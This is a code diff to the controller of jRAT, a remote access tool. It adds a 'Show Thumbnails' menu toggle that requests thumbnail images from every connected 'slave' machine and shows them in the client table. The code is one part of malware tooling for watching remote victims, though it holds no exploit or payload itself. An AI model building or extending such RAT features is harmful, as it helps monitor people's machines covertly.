@@ -25,6 +25,7 @@ import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.Status;
+import se.jrat.controller.packets.outgoing.Packet40Thumbnail;
 import se.jrat.controller.settings.Settings;
 import se.jrat.controller.settings.SettingsColumns;
 import se.jrat.controller.ui.Columns;
@@ -41,6 +42,8 @@ public class PanelMainClientsTable extends PanelMainClients {
 
 	private JTable table;
 	private TableModel model;
+	
+	private boolean showThumbnails;
 	
 	public PanelMainClientsTable() {
 		for (Columns s : Columns.values()) {
@@ -187,7 +190,7 @@ public class PanelMainClientsTable extends PanelMainClients {
 				
 				label.setIcon(null);
 				
-				if (colname.equals(Columns.COUNTRY.getName()) && Main.instance.showThumbnails()) {
+				if (colname.equals(Columns.COUNTRY.getName()) && showThumbnails) {
 					if (slave.getThumbnail() == null) {
 						label.setText("Loading...");
 					} else {
@@ -323,6 +326,28 @@ public class PanelMainClientsTable extends PanelMainClients {
 			
 			mnColumns.add(jcb);
 		}
+
+		JCheckBoxMenuItem mntmShowshowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
+		menu.add(mntmShowshowThumbnails);
+		mntmShowshowThumbnails.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				showThumbnails = !showThumbnails;
+
+				if (showThumbnails) {
+					for (int i = 0; i < Main.connections.size(); i++) {
+						AbstractSlave sl = Main.connections.get(i);
+						if (sl.getThumbnail() == null) {
+							if (sl instanceof Slave) {
+								((Slave) sl).addToSendQueue(new Packet40Thumbnail());
+							}
+						}
+					}
+					setRowHeight(100);
+				} else {
+					resetRowHeight();
+				}
+			}
+		});
 		
 		JMenu mnTableResizeBehaviour = new JMenu("Table resize behaviour");
 		menu.add(mnTableResizeBehaviour);
